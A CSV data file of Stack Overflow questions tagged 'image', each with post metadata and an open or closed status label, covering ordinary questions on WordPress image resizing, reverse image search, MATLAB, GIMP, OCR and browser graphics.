PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
2001111,01/04/2010 18:05:02,147306,07/29/2009 18:15:40,27,4,Tagging images in document,"I 'm trying to do add tags to word/pdf documents like taggify does.

I was looking for suggestions on how to start?

This question is an extension of 
http://stackoverflow.com/questions/128305/tag-images-in-the-image-itself-how-to
thxs
",image,tags,pdf,ms-word,,,open,0,27,4,"Tagging images in document I 'm trying to do add tags to word/pdf documents like taggify does.

I was looking for suggestions on how to start?

This question is an extension of 
http://stackoverflow.com/questions/128305/tag-images-in-the-image-itself-how-to
thxs
",4
11459517,07/12/2012 19:48:17,1521834,07/12/2012 19:25:43,1,0,No longer able to push pre-compiled Photo Albums into the News Feed [US Navy],"As of 11 July (early AM hours) I am no longer able to push / post pre-compiled Photo Albums
into the Facebook News Feed, 
Previous to 11 July I was able to simply add a new Photo to a existing
pre-compiled Photo Album and click Post and it would be pushed / published (the entire Album) into the News Feed. 
This method is now failing and only posts the desired Album to the Timeline.
If anyone can offer advice on why this is now happening and any possible solutions it would
be greatly appreciated by the Naval History & Heritage Command Facebook Team.
We post up to 6 individual Photo Albums each Day with their accompanying stories and this
apparent breakage has severely impacted our operations.
Thanks in advance and pls. feel free to contact me directly at 
rod.doty@facebook.com

Best Regards,
Rod Doty,
Content Contributor 
[HTM Volunteer] -
Naval History & Heritage Command -
805 Kidder Breese Street SE -
Washington DC Naval Yards,
Washington, DC - 20374
http://www.facebook.com/navalhistory",image,photo,photos,facebook-fanpage,facebook-stream-story,07/12/2012 19:57:56,off topic,1,154,14,"No longer able to push pre-compiled Photo Albums into the News Feed [US Navy] As of 11 July (early AM hours) I am no longer able to push / post pre-compiled Photo Albums
into the Facebook News Feed, 
Previous to 11 July I was able to simply add a new Photo to a existing
pre-compiled Photo Album and click Post and it would be pushed / published (the entire Album) into the News Feed. 
This method is now failing and only posts the desired Album to the Timeline.
If anyone can offer advice on why this is now happening and any possible solutions it would
be greatly appreciated by the Naval History & Heritage Command Facebook Team.
We post up to 6 individual Photo Albums each Day with their accompanying stories and this
apparent breakage has severely impacted our operations.
Thanks in advance and pls. feel free to contact me directly at 
rod.doty@facebook.com

Best Regards,
Rod Doty,
Content Contributor 
[HTM Volunteer] -
Naval History & Heritage Command -
805 Kidder Breese Street SE -
Washington DC Naval Yards,
Washington, DC - 20374
http://www.facebook.com/navalhistory",5
7490223,09/20/2011 18:51:47,955447,09/20/2011 18:51:47,1,0,How to remove emptied html & Image tags in WP,"I had more than 15000 post, on WP but unfortunately one folder image of deleted. Now I want to remove all those tags that i.e emptied ( contain no pictures or img tags are not proper) or all break html tags ",image,tags,break,src,,09/21/2011 16:33:55,off topic,1,42,10,"How to remove emptied html & Image tags in WP I had more than 15000 post, on WP but unfortunately one folder image of deleted. Now I want to remove all those tags that i.e emptied ( contain no pictures or img tags are not proper) or all break html tags ",4
2955063,06/02/2010 04:45:59,171758,09/10/2009 23:04:00,875,28,Free (as in beer) Reverse Image Search API/Library/Service,"[![TinEye sample result][1]][2]

[TinEye][3] provides a great way to ""reverse"" search by image (i.e. upload/transload an image and have multiple possible sources of that image returned as results.)

Since screen-scraping is messy and unreliable, I'm looking for a **free API/library/web-service** that could offer the same (or similar) **reverse-image search** function.

At present, [TinEye offers a commercial API][4], but since I'll only be using the service for small personal projects, it's hard to justify the cost of the service (the lowest being 1,000 searches for $70 USD).

Is anyone aware of such a free service? Or is there a simpler way to approach this (programmatic solution; any language)?

I understand that this is a tall order, and submitting the question is really only a last resort in the hope that there is some solution.

*Example image search is 99designs' StackOverflow [logo competition entry by  wolv](http://99designs.com/logo-design/contests/logo-stackoverflow-6774/entries/141)*


  [1]: http://i.imgur.com/NjXjFm.jpg
  [2]: http://imgur.com/NjXjF.jpg
  [3]: http://www.tineye.com/
  [4]: http://www.tineye.com/commercial_api",image,api,search,free,,06/27/2012 16:02:49,not constructive,1,151,8,"Free (as in beer) Reverse Image Search API/Library/Service [![TinEye sample result][1]][2]

[TinEye][3] provides a great way to ""reverse"" search by image (i.e. upload/transload an image and have multiple possible sources of that image returned as results.)

Since screen-scraping is messy and unreliable, I'm looking for a **free API/library/web-service** that could offer the same (or similar) **reverse-image search** function.

At present, [TinEye offers a commercial API][4], but since I'll only be using the service for small personal projects, it's hard to justify the cost of the service (the lowest being 1,000 searches for $70 USD).

Is anyone aware of such a free service? Or is there a simpler way to approach this (programmatic solution; any language)?

I understand that this is a tall order, and submitting the question is really only a last resort in the hope that there is some solution.

*Example image search is 99designs' StackOverflow [logo competition entry by  wolv](http://99designs.com/logo-design/contests/logo-stackoverflow-6774/entries/141)*


  [1]: http://i.imgur.com/NjXjFm.jpg
  [2]: http://imgur.com/NjXjF.jpg
  [3]: http://www.tineye.com/
  [4]: http://www.tineye.com/commercial_api",4
4217896,11/18/2010 17:48:23,16562,09/17/2008 18:29:02,1314,27,"How can I determine the dimensions of an image file of arbitrary format (JPEG, PNG, etc.) on the JVM?","I'd like to go through a directory and pick out all the images and then do some things based on their dimensions.  What libraries are available for me to do this?

I'm working in Clojure but anything available on the JVM is fair game.

Thanks in advance!",image,clojure,jvm,,,,open,0,46,19,"How can I determine the dimensions of an image file of arbitrary format (JPEG, PNG, etc.) on the JVM? I'd like to go through a directory and pick out all the images and then do some things based on their dimensions.  What libraries are available for me to do this?

I'm working in Clojure but anything available on the JVM is fair game.

Thanks in advance!",3
9644708,03/10/2012 07:25:22,503947,11/11/2010 00:38:33,55,0,What does phase of an image means?,"What does phase of an image means? In the context of image processing. How do we find it?

",image,matlab,image-processing,matlab-toolbox,,,open,0,18,7,"What does phase of an image means? What does phase of an image means? In the context of image processing. How do we find it?

",4
6883359,07/30/2011 13:21:26,698943,04/08/2011 15:35:57,1,0,WP-Debug Issue with Image Resizing Script (WordPress),"Working with Victor Teixeira's image resizing script, and have used it on several premium themes.  It functions great, but I'm getting some notices when I run the debugger, and I don't know how to resolve it.  I wonder if anyone can help?  :)

Here are the notices:

        Notice: Undefined variable: file_path in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 129
		
		Notice: Undefined index: extension in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 130
		
		Notice: Undefined index: dirname in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 133
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 139
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 139
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 194
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 195
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 196

And here is the code:

    function vt_resize( $attach_id = null, $img_url = null, $width, $height, $crop = false ) {

	// this is an attachment, so we have the ID
	if ( $attach_id ) {
	
		$image_src = wp_get_attachment_image_src( $attach_id, 'full' );
		$file_path = get_attached_file( $attach_id );
	
	// this is not an attachment, let's use the image url
	} else if ( $img_url ) {
		
		$file_path = parse_url( $img_url );
		$file_path = $_SERVER['DOCUMENT_ROOT'] . $file_path['path'];
		
		//$file_path = ltrim( $file_path['path'], '/' );
		//$file_path = rtrim( ABSPATH, '/' ).$file_path['path'];
		
		$orig_size = getimagesize( $file_path );
		
		$image_src[0] = $img_url;
		$image_src[1] = $orig_size[0];
		$image_src[2] = $orig_size[1];
	}
	
	$file_info = pathinfo( $file_path );
	$extension = '.'. $file_info['extension'];

	// the image path without the extension
	$no_ext_path = $file_info['dirname'].'/'.$file_info['filename'];

	$cropped_img_path = $no_ext_path.'-'.$width.'x'.$height.$extension;

	// checking if the file size is larger than the target size
	// if it is smaller or the same size, stop right here and return
	if ( $image_src[1] > $width || $image_src[2] > $height ) {

		// the file is larger, check if the resized version already exists (for $crop = true but will also work for $crop = false if the sizes match)
		if ( file_exists( $cropped_img_path ) ) {

			$cropped_img_url = str_replace( basename( $image_src[0] ), basename( $cropped_img_path ), $image_src[0] );
			
			$vt_image = array (
				'url' => $cropped_img_url,
				'width' => $width,
				'height' => $height
			);
			
			return $vt_image;
		}

		// $crop = false
		if ( $crop == false ) {
		
			// calculate the size proportionaly
			$proportional_size = wp_constrain_dimensions( $image_src[1], $image_src[2], $width, $height );
			$resized_img_path = $no_ext_path.'-'.$proportional_size[0].'x'.$proportional_size[1].$extension;			

			// checking if the file already exists
			if ( file_exists( $resized_img_path ) ) {
			
				$resized_img_url = str_replace( basename( $image_src[0] ), basename( $resized_img_path ), $image_src[0] );

				$vt_image = array (
					'url' => $resized_img_url,
					'width' => $proportional_size[0],
					'height' => $proportional_size[1]
				);
				
				return $vt_image;
			}
		}

		// no cache files - let's finally resize it
		$new_img_path = image_resize( $file_path, $width, $height, $crop );
		$new_img_size = getimagesize( $new_img_path );
		$new_img = str_replace( basename( $image_src[0] ), basename( $new_img_path ), $image_src[0] );

		// resized output
		$vt_image = array (
			'url' => $new_img,
			'width' => $new_img_size[0],
			'height' => $new_img_size[1]
		);
		
		return $vt_image;
	}

	// default output - without resizing
	$vt_image = array (
		'url' => $image_src[0],
		'width' => $image_src[1],
		'height' => $image_src[2]
	);
	
	return $vt_image;
     }

Thanks you in advance.  This issue is causing me a headache :)

",image,wordpress,image-resizing,,,,open,0,440,7,"WP-Debug Issue with Image Resizing Script (WordPress) Working with Victor Teixeira's image resizing script, and have used it on several premium themes.  It functions great, but I'm getting some notices when I run the debugger, and I don't know how to resolve it.  I wonder if anyone can help?  :)

Here are the notices:

        Notice: Undefined variable: file_path in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 129
		
		Notice: Undefined index: extension in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 130
		
		Notice: Undefined index: dirname in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 133
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 139
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 139
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 194
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 195
		
		Notice: Undefined variable: image_src in /nfs/c03/h01/mnt/51370/domains/minimalpixels.com/html/wp-content/themes/paragon/framework/functions/basicFunctions.php on line 196

And here is the code:

    function vt_resize( $attach_id = null, $img_url = null, $width, $height, $crop = false ) {

	// this is an attachment, so we have the ID
	if ( $attach_id ) {
	
		$image_src = wp_get_attachment_image_src( $attach_id, 'full' );
		$file_path = get_attached_file( $attach_id );
	
	// this is not an attachment, let's use the image url
	} else if ( $img_url ) {
		
		$file_path = parse_url( $img_url );
		$file_path = $_SERVER['DOCUMENT_ROOT'] . $file_path['path'];
		
		//$file_path = ltrim( $file_path['path'], '/' );
		//$file_path = rtrim( ABSPATH, '/' ).$file_path['path'];
		
		$orig_size = getimagesize( $file_path );
		
		$image_src[0] = $img_url;
		$image_src[1] = $orig_size[0];
		$image_src[2] = $orig_size[1];
	}
	
	$file_info = pathinfo( $file_path );
	$extension = '.'. $file_info['extension'];

	// the image path without the extension
	$no_ext_path = $file_info['dirname'].'/'.$file_info['filename'];

	$cropped_img_path = $no_ext_path.'-'.$width.'x'.$height.$extension;

	// checking if the file size is larger than the target size
	// if it is smaller or the same size, stop right here and return
	if ( $image_src[1] > $width || $image_src[2] > $height ) {

		// the file is larger, check if the resized version already exists (for $crop = true but will also work for $crop = false if the sizes match)
		if ( file_exists( $cropped_img_path ) ) {

			$cropped_img_url = str_replace( basename( $image_src[0] ), basename( $cropped_img_path ), $image_src[0] );
			
			$vt_image = array (
				'url' => $cropped_img_url,
				'width' => $width,
				'height' => $height
			);
			
			return $vt_image;
		}

		// $crop = false
		if ( $crop == false ) {
		
			// calculate the size proportionaly
			$proportional_size = wp_constrain_dimensions( $image_src[1], $image_src[2], $width, $height );
			$resized_img_path = $no_ext_path.'-'.$proportional_size[0].'x'.$proportional_size[1].$extension;			

			// checking if the file already exists
			if ( file_exists( $resized_img_path ) ) {
			
				$resized_img_url = str_replace( basename( $image_src[0] ), basename( $resized_img_path ), $image_src[0] );

				$vt_image = array (
					'url' => $resized_img_url,
					'width' => $proportional_size[0],
					'height' => $proportional_size[1]
				);
				
				return $vt_image;
			}
		}

		// no cache files - let's finally resize it
		$new_img_path = image_resize( $file_path, $width, $height, $crop );
		$new_img_size = getimagesize( $new_img_path );
		$new_img = str_replace( basename( $image_src[0] ), basename( $new_img_path ), $image_src[0] );

		// resized output
		$vt_image = array (
			'url' => $new_img,
			'width' => $new_img_size[0],
			'height' => $new_img_size[1]
		);
		
		return $vt_image;
	}

	// default output - without resizing
	$vt_image = array (
		'url' => $image_src[0],
		'width' => $image_src[1],
		'height' => $image_src[2]
	);
	
	return $vt_image;
     }

Thanks you in advance.  This issue is causing me a headache :)

",3
8345101,12/01/2011 16:49:58,342259,05/16/2010 07:24:01,313,0,"How could I have image URLs in column ""C"" display their corresponding images in column ""N"" in Excel?","I've an Excel file with a bunch of columns, one of which is ""ImageURL"", which, of course, displays unique URLs as text.

How could I set it up such that those images are also depicted within another column?",image,excel,vba,macros,,,open,0,37,18,"How could I have image URLs in column ""C"" display their corresponding images in column ""N"" in Excel? I've an Excel file with a bunch of columns, one of which is ""ImageURL"", which, of course, displays unique URLs as text.

How could I set it up such that those images are also depicted within another column?",4
2648354,04/15/2010 19:28:07,27305,10/13/2008 03:41:50,1056,13,Image Gallery Manager for PHP and MySQL?,"Can anyone recommend a plugin or library that allows people to upload images which automatically gets cropped and resized?  I don't mind editting some config files to specify how images should be cropped and resized.

Additionally, after uploading, the front end user should be able to drag and drop for re-ordering.

Can someone recommend something that works with php?",image,gallery,,,,11/22/2011 08:09:08,off topic,1,58,7,"Image Gallery Manager for PHP and MySQL? Can anyone recommend a plugin or library that allows people to upload images which automatically gets cropped and resized?  I don't mind editting some config files to specify how images should be cropped and resized.

Additionally, after uploading, the front end user should be able to drag and drop for re-ordering.

Can someone recommend something that works with php?",2
7834769,10/20/2011 10:45:14,999116,10/17/2011 12:08:22,1,1,Magento - New module edit action is creating a new item,"I am creating a module to add banners. Now I have a problem when I want to edit a banner.

The problem is that when I click ""save"", Magento creates a new banner and doesn't modify the original banner. It happens when I modify something and if I don't modify anything and click ""save"".

I have another problem. I have an image fiel and it's working great but when I click ""edit"", it shows the preview image and the delete check box but the field is empty and if I save the banner it leaves the image field empty.

I hope you can help me. Thanks in advance, if you need more information ask me for it.",image,magento,edit,,,,open,0,114,11,"Magento - New module edit action is creating a new item I am creating a module to add banners. Now I have a problem when I want to edit a banner.

The problem is that when I click ""save"", Magento creates a new banner and doesn't modify the original banner. It happens when I modify something and if I don't modify anything and click ""save"".

I have another problem. I have an image fiel and it's working great but when I click ""edit"", it shows the preview image and the delete check box but the field is empty and if I save the banner it leaves the image field empty.

I hope you can help me. Thanks in advance, if you need more information ask me for it.",3
3195395,07/07/2010 13:51:28,380475,06/30/2010 20:14:08,1,1,Flex4 get height and width of an mx:Image,"I want to find out what the original height and width is for an uploaded image.

  1)  I want to control the height and width of the image manually relative to it's original dimensions.

  2)  I want to measure the DPI of the image as it is being scaled.

   3)  I'm having difficulty populating spark List containers without manually adding height and width properties.


From what I can see the mx:image component (after you set the image source) maintains a height and width of 0.  If flash does indeed set these properties after the image is loaded, then:

  1) What event can I listen for so I can go in and get these properties after they have been set.

  2) What method can I call to resize all the components in a List control?

In some of the cases I am setting the image source to an external URL.  In other cases I am setting the image source to an internal ByteArray which was obtained through the FileReference class.",image,flex4,dimensions,,,,open,0,178,8,"Flex4 get height and width of an mx:Image I want to find out what the original height and width is for an uploaded image.

  1)  I want to control the height and width of the image manually relative to it's original dimensions.

  2)  I want to measure the DPI of the image as it is being scaled.

   3)  I'm having difficulty populating spark List containers without manually adding height and width properties.


From what I can see the mx:image component (after you set the image source) maintains a height and width of 0.  If flash does indeed set these properties after the image is loaded, then:

  1) What event can I listen for so I can go in and get these properties after they have been set.

  2) What method can I call to resize all the components in a List control?

In some of the cases I am setting the image source to an external URL.  In other cases I am setting the image source to an internal ByteArray which was obtained through the FileReference class.",3
7214339,08/27/2011 11:48:07,428378,08/23/2010 11:59:31,57,5,Graphs with images as an imagemap or is there an alternative method?,"I need to display some graphical chart data on a website. In these charts are several images that when clicked on should display a larger version of the image. The charts themselves are currently saved as a single image file.

My initial thoughts are to use an imagemap to specify where the images are in the overall chart image and then use jQuery to highlight around the edge of the images. Then using something like lightbox or fancybox display the larger version clicked on image.

What I would appreciate is some insight as to whether this is the best way to achieve the desired result or if there is a better technique?

Thanks",image,graph,fancybox,lightbox,imagemap,,open,0,110,12,"Graphs with images as an imagemap or is there an alternative method? I need to display some graphical chart data on a website. In these charts are several images that when clicked on should display a larger version of the image. The charts themselves are currently saved as a single image file.

My initial thoughts are to use an imagemap to specify where the images are in the overall chart image and then use jQuery to highlight around the edge of the images. Then using something like lightbox or fancybox display the larger version clicked on image.

What I would appreciate is some insight as to whether this is the best way to achieve the desired result or if there is a better technique?

Thanks",5
8835629,01/12/2012 13:12:41,1043463,11/12/2011 18:52:39,26,0,Image background transparent GIMP,"I have a few jpg images and I need to have a transparent background. I will add these images in a web page and I need to see just the main element of the image and the web page beneath.
Does anyone know how to transform an image in one with a transparent background?
I have GIMP.
Thanks",image,transparency,gimp,,,01/13/2012 01:32:32,off topic,1,55,4,"Image background transparent GIMP I have a few jpg images and I need to have a transparent background. I will add these images in a web page and I need to see just the main element of the image and the web page beneath.
Does anyone know how to transform an image in one with a transparent background?
I have GIMP.
Thanks",3
5110136,02/24/2011 20:36:45,478573,10/17/2010 14:54:01,209,10,Chrome browser image defect,"I have some images on a page and the Chrome browser renders strange little things that look like broken images right next to the images. Would anyone know why this is happening?

This is a page where images can be found (towards bottom/middle):
http://www.comehike.com/hikes/scheduled_hike.php?hike_id=108",image,browser,user-interface,google-chrome,img,03/19/2011 16:34:19,too localized,1,42,4,"Chrome browser image defect I have some images on a page and the Chrome browser renders strange little things that look like broken images right next to the images. Would anyone know why this is happening?

This is a page where images can be found (towards bottom/middle):
http://www.comehike.com/hikes/scheduled_hike.php?hike_id=108",5
10237068,04/19/2012 21:28:30,515614,11/22/2010 04:24:09,145,19,How can I prove that images were stolen?,"How can I prove that images were stolen from a website? 
Is there any way to check **from when** an another website have the same images? I have no any access to the server.
Thanks for **any** idea! ",image,work-stealing,,,,04/20/2012 18:31:30,off topic,1,38,8,"How can I prove that images were stolen? How can I prove that images were stolen from a website? 
Is there any way to check **from when** an another website have the same images? I have no any access to the server.
Thanks for **any** idea! ",2
11486956,07/14/2012 19:54:24,1506712,07/06/2012 12:13:50,3,2,How to overlap several images in Matlab?,"I have the images A, B and C. How to overlay these images to result in D using Matlab? I have at least 50 images to make it. Thanks.

[**A**][1]

[**B**][2]

[**C**][3]

[**D (ABC overlaped)**][4]



  [1]: https://docs.google.com/open?id=0B5AOSYBy_josQ3R3Y29VVFJVUHc
  [2]: https://docs.google.com/open?id=0B5AOSYBy_josTVIwWUN1a085T0U
  ",image,matlab,overlay,,,,open,0,39,7,"How to overlap several images in Matlab? I have the images A, B and C. How to overlay these images to result in D using Matlab? I have at least 50 images to make it. Thanks.

[**A**][1]

[**B**][2]

[**C**][3]

[**D (ABC overlaped)**][4]



  [1]: https://docs.google.com/open?id=0B5AOSYBy_josQ3R3Y29VVFJVUHc
  [2]: https://docs.google.com/open?id=0B5AOSYBy_josTVIwWUN1a085T0U
  ",3
7209252,08/26/2011 18:50:20,250405,01/14/2010 03:00:40,31,0,OCR algorithm flowchart for extracting name and numbers,"I am not to OCR and image processing. I need to scan a credit card and extract the name, credit card number, and expiration date? What algorithm/flowchart/logic should I use. For instance, I'm looking for pseudo code or a flowchart. For example, how do I detect and segment the first and last name on the credit card? How would I detect and segment the credit card number? How can I differentiate between the name and credit card number? How can I detect and segment the expiration date?

I am looking for something like this THIS is just the type input that I'm looking for. not saying this is the way it should be done (Not looking for code, but would helpful):

- 1) detect the credit card image out of the entire image.
- 2) Detect and locate the name .....how?
- 3) if this else
- 4) search for

Best regards.",image,name,ocr,processing,extraction,08/27/2011 20:45:20,not a real question,1,146,8,"OCR algorithm flowchart for extracting name and numbers I am not to OCR and image processing. I need to scan a credit card and extract the name, credit card number, and expiration date? What algorithm/flowchart/logic should I use. For instance, I'm looking for pseudo code or a flowchart. For example, how do I detect and segment the first and last name on the credit card? How would I detect and segment the credit card number? How can I differentiate between the name and credit card number? How can I detect and segment the expiration date?

I am looking for something like this THIS is just the type input that I'm looking for. not saying this is the way it should be done (Not looking for code, but would helpful):

- 1) detect the credit card image out of the entire image.
- 2) Detect and locate the name .....how?
- 3) if this else
- 4) search for

Best regards.",5
10372681,04/29/2012 13:59:28,483660,10/21/2010 23:45:43,144,1,how to perform color quantization in matlab or otherwise,"I am implementing a machine learning algorithm in matlab, and was doing some reading up on the color range of the human eye, and was informed that the human eye can only perceive about 17,000 colors, where as the images I have about 256^3 colours. What is the best way to quantization my images, in matlab or otherwise. 
Also, as a side question in terms of machine learning, which one is better to use bitmap or jpeg?",image,matlab,image-processing,,,,open,0,77,9,"how to perform color quantization in matlab or otherwise I am implementing a machine learning algorithm in matlab, and was doing some reading up on the color range of the human eye, and was informed that the human eye can only perceive about 17,000 colors, where as the images I have about 256^3 colours. What is the best way to quantization my images, in matlab or otherwise. 
Also, as a side question in terms of machine learning, which one is better to use bitmap or jpeg?",3
7540366,09/24/2011 16:42:58,962791,09/24/2011 16:23:33,1,0,merge QR code graphic with brand logo javascript,"I'm looking for a script that merges two graphics into one.
one graphic is my logo here: http://www.qr4.com/code_image/Q_for_codes.png

the other is the QR code to my website here: http://chart.apis.google.com/chart?cht=qr&chl=http://www.qr4.com/&chs=245x245

what i'm looking to do is merge the two into one ""branded"" graphic...

any ideas?
Thnaks",image,merge,branding,,,01/15/2012 12:30:23,off topic,1,40,8,"merge QR code graphic with brand logo javascript I'm looking for a script that merges two graphics into one.
one graphic is my logo here: http://www.qr4.com/code_image/Q_for_codes.png

the other is the QR code to my website here: http://chart.apis.google.com/chart?cht=qr&chl=http://www.qr4.com/&chs=245x245

what i'm looking to do is merge the two into one ""branded"" graphic...

any ideas?
Thnaks",3
4177006,11/14/2010 09:55:26,507280,11/14/2010 09:55:26,1,0,CSI style zoom in and enhance now possible?,"I have always thought the way they zoom in and enhance on TV and movies was strictly impossible. Essentially because you cannot create more information that there is to begin with.

There were ways to get better looking or clearer images like with re-sampling, but never to the extent seen on film.

Now, it seems that is not true.

I was reading [this][1] article, and it seems they have a way to do that now? 

Or, is this just a better version of what was already possible? You still need to have a fairly clear image to start with? Otherwise, what are the limits of this technique?


  [1]: http://www.wired.com/magazine/2010/02/ff_algorithm/",image,image-processing,image-enhancement,,,11/15/2010 20:31:35,off topic,1,107,8,"CSI style zoom in and enhance now possible? I have always thought the way they zoom in and enhance on TV and movies was strictly impossible. Essentially because you cannot create more information that there is to begin with.

There were ways to get better looking or clearer images like with re-sampling, but never to the extent seen on film.

Now, it seems that is not true.

I was reading [this][1] article, and it seems they have a way to do that now? 

Or, is this just a better version of what was already possible? You still need to have a fairly clear image to start with? Otherwise, what are the limits of this technique?


  [1]: http://www.wired.com/magazine/2010/02/ff_algorithm/",3
8960053,01/22/2012 09:01:50,124119,06/17/2009 06:31:40,1670,89,"What to choose for eye-candy, webkit only?","I want to make a **Google Chrome extension** (which is basically like a web page), and I'd like to use a lot of eye candy.

Let's take a button as an example. It could have a multi-step linear gradient in the middle (for a glossy look), rounded corners, a 1px stroke, inner glow (box-shadow: inset) and drop shadow, plus text in the middle with text-shadow. Maybe also transparency while not hoovered and even a 2D/3D transform to make it look laid on top of something. Of course this is a lot, but is a plausible example.

**Now which technology to choose:**

##CSS3  
There's a lot of eye-candy potential in CSS3. I'm just worried it's not very optimized yet. I don't know how fast or slow it is because I've never abused it (if you know some place really taking it to the limit, I'd like to see).

##SVG  
SVG looks promising because it was meant for complex graphics. Almost anything can be done with it, and I can use Inkscape to edit it. I just don't know how fast a whole interface made with it would be (for example, if I edit something in the SVG DOM, would the whole SVG be rendered again, or just the modified part?). Also, not many people seem to be using it in browsers yet.

##Canvas  
As a drawing surface, I can paint things like a button myself. Looks very useful to add certain effects, but overall it's quite a hassle to do everything with it, since I'll have to take care of the actual drawing of the images.

##Images  
Well, images are what we most end up doing, but just because we have to support ancient browsers, which is not the case here. Of course images should be easy for the browser to render, but how much? If the difference is small, I'd avoid them for being the less flexible technique. I'd use them if they're really faster to render (I'm even dropping jQuery for performance, so this shouldn't be so hard). Note that on normal web pages, images take time to be downloaded, here they don't.

**Note:** I'm aware of WebGL. I don't even consider getting close to it until browsers start embedding software rendering fallbacks, because its support is beyond terrible for a web technology. I also don't think I should be using Flash here.
",image,css3,canvas,svg,google-chrome-extension,01/22/2012 12:52:10,not a real question,1,391,7,"What to choose for eye-candy, webkit only? I want to make a **Google Chrome extension** (which is basically like a web page), and I'd like to use a lot of eye candy.

Let's take a button as an example. It could have a multi-step linear gradient in the middle (for a glossy look), rounded corners, a 1px stroke, inner glow (box-shadow: inset) and drop shadow, plus text in the middle with text-shadow. Maybe also transparency while not hoovered and even a 2D/3D transform to make it look laid on top of something. Of course this is a lot, but is a plausible example.

**Now which technology to choose:**

##CSS3  
There's a lot of eye-candy potential in CSS3. I'm just worried it's not very optimized yet. I don't know how fast or slow it is because I've never abused it (if you know some place really taking it to the limit, I'd like to see).

##SVG  
SVG looks promising because it was meant for complex graphics. Almost anything can be done with it, and I can use Inkscape to edit it. I just don't know how fast a whole interface made with it would be (for example, if I edit something in the SVG DOM, would the whole SVG be rendered again, or just the modified part?). Also, not many people seem to be using it in browsers yet.

##Canvas  
As a drawing surface, I can paint things like a button myself. Looks very useful to add certain effects, but overall it's quite a hassle to do everything with it, since I'll have to take care of the actual drawing of the images.

##Images  
Well, images are what we most end up doing, but just because we have to support ancient browsers, which is not the case here. Of course images should be easy for the browser to render, but how much? If the difference is small, I'd avoid them for being the less flexible technique. I'd use them if they're really faster to render (I'm even dropping jQuery for performance, so this shouldn't be so hard). Note that on normal web pages, images take time to be downloaded, here they don't.

**Note:** I'm aware of WebGL. I don't even consider getting close to it until browsers start embedding software rendering fallbacks, because its support is beyond terrible for a web technology. I also don't think I should be using Flash here.
",5
